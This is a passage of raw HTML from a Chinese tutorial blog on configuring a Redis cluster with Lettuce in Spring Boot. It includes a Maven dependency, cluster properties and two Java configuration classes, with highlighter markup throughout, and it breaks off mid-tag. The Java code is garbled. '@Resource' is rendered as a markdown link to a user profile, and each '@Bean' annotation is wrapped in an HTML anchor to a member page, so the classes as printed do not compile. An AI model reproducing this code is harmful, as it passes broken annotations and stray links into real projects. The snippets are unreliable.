class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;dependency&gt;\r\n &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;\r\n&lt;/dependency&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67105430c504631424-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105430c504631424-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105430c504631424-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105430c504631424-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67105430c504631424-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105430c504631424-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">springframework</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105430c504631424-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">spring</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">starter</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105430c504631424-4\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n<p>（2）springboot的配置文件要包含如下内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67105430f351480805\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nspring.redis.database=0\r\nspring.redis.lettuce.pool.max-idle=10\r\nspring.redis.lettuce.pool.max-wait=500\r\nspring.redis.cluster.timeout=1000\r\nspring.redis.cluster.max-redirects=3\r\n\r\nspring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:7005   </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67105430f351480805-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105430f351480805-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105430f351480805-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105430f351480805-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105430f351480805-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67105430f351480805-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67105430f351480805-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67105430f351480805-1\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">database</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105430f351480805-2\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">lettuce</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">idle</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105430f351480805-3\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">lettuce</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">wait</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105430f351480805-4\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">timeout</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1000</span></div><div class=\"crayon-line\" id=\"crayon-5bab67105430f351480805-5\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">max</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">redirects</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67105430f351480805-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab67105430f351480805-7\"><span class=\"crayon-v\">spring</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nodes</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7000</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7004</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">172.20.52.85</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7005</span><span class=\"crayon-h\">   </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0060 seconds] -->\r\n<p>（3）新建RedisConfiguration类，参考代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054313533102921\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@Configuration\r\npublic class RedisConfiguration {\r\n [@Resource](https://my.oschina.net/u/929718)\r\n private LettuceConnectionFactory myLettuceConnectionFactory;\r\n\r\n\r\n &lt;a href='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;\r\n public RedisTemplate&lt;String, Serializable&gt; redisTemplate() {\r\n\r\n RedisTemplate&lt;String, Serializable&gt; template = new RedisTemplate&lt;&gt;();\r\n\r\n template.setKeySerializer(new StringRedisSerializer());\r\n\r\n //template.setValueSerializer(new GenericJackson2JsonRedisSerializer());\r\n template.setValueSerializer(new StringRedisSerializer());\r\n\r\n template.setConnectionFactory(myLettuceConnectionFactory);\r\n\r\n return template;\r\n\r\n }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054313533102921-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054313533102921-22\">22</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">Configuration</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisConfiguration</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Resource</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//my.oschina.net/u/929718)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LettuceConnectionFactory </span><span class=\"crayon-v\">myLettuceConnectionFactory</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q890462235'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Bean</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisTemplate</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Serializable</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">redisTemplate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisTemplate</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Serializable</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">template</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RedisTemplate</span><span class=\"crayon-o\">&lt;&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">template</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setKeySerializer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StringRedisSerializer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//template.setValueSerializer(new GenericJackson2JsonRedisSerializer());</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-15\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">template</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setValueSerializer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StringRedisSerializer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-16\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-17\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">template</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setConnectionFactory</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">myLettuceConnectionFactory</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-18\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-19\"><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">template</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-20\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054313533102921-21\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054313533102921-22\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n<p>（4）新建RedisFactoryConfig类，参考代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671054316110233798\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@Configuration\r\npublic class RedisFactoryConfig {\r\n\r\n @Autowired\r\n private Environment environment;\r\n\r\n\r\n &lt;a href='http://www.jobbole.com/members/q890462235'&gt;@Bean&lt;/a&gt;\r\n public RedisConnectionFactory myLettuceConnectionFactory() {\r\n Map&lt;String, Object&gt; source = new HashMap&lt;String, Object&gt;();\r\n\r\n source.put(\"spring.redis.cluster.nodes\", environment.getProperty(\"spring.redis.cluster.nodes\"));\r\n source.put(\"spring.redis.cluster.timeout\", environment.getProperty(\"spring.redis.cluster.timeout\"));\r\n source.put(\"spring.redis.cluster.max-redirects\", environment.getProperty(\"spring.redis.cluster.max-redirects\"));\r\n\r\n RedisClusterConfiguration redisClusterConfiguration;\r\n\r\n redisClusterConfiguration = new RedisClusterConfiguration(new MapPropertySource(\"RedisClusterConfiguration\", source));\r\n\r\n return new LettuceConnectionFactory(redisClusterConfiguration);\r\n\r\n }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054316110233798-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054316110233798-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">Configuration</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisFactoryConfig</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">Autowired</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-5\"><span class=\"crayon-e\"> </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Environment </span><span class=\"crayon-v\">environment</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q890462235'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Bean</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054316110233798-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisConnectionFactory </span><span class=\"crayon-e\">myLettuceConnectionFactory</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054316110233798-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Map</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Object</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HashMap</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Object</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span 